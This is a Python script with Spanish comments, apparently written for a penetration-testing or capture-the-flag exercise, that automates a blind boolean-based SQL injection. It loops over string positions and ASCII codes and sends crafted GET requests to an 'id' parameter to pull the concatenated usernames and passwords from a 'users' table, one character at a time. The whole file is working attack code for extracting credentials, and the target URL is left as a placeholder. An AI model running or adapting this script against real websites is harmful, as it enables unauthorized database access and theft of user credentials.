#!/usr/bin/python3

import requests 
import signal
import sys
import time
import string
from pwn import *


    #Necesita 2 valores, si no da error syntax o error de declaracion. Al presionar Ctrl+C -> Salir.
def def_handler(sig, frame):
    print("\n\n[!] Salinedo...\n")
    #Salir con un estado no exitoso.
    sys.exit(1)


# Crtl+C
signal.signal(signal.SIGINT, def_handler)

 
# Variables Globales
main_url = "La --url"
# Todas las posibles combinatorias de caracteres #import string
characters = string.printable

    #Definicion de makeSQLI()
def makeSQLI():

    #pwn tools (barras de progreso)
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    
    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""
    #Cambiar el 9 por un campo que no exista #9#
    #Bucle principal que fila la posicion:
    for position in range(1, 150):
        for character in range(33, 126):                                           
            sqli_url = main_url + "?id=#9# or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),
%d,1)) from users where id = 1)=%d)" % (position, character)   #Posiciones de bucle con % las pones         
            
            p1.status(sqli_url)

            # Con la libreria requests, envias una peticion por get a sqli_url
            r = requests.get(sqli_url)
            # Si el codigo es 200, muestralo, de decimal con chr lo pasas a texto
            if r.status_code == 200:
              extracted_info += chr(character)
              p2.status(extracted_info)
                #Saltar a la siguente iteracion y que no siga probrando para la posicion acual mas caracteres
              break
   

   #Flujo inicial del programa:

if __name__ == '__main__':

   
    makeSQLI()

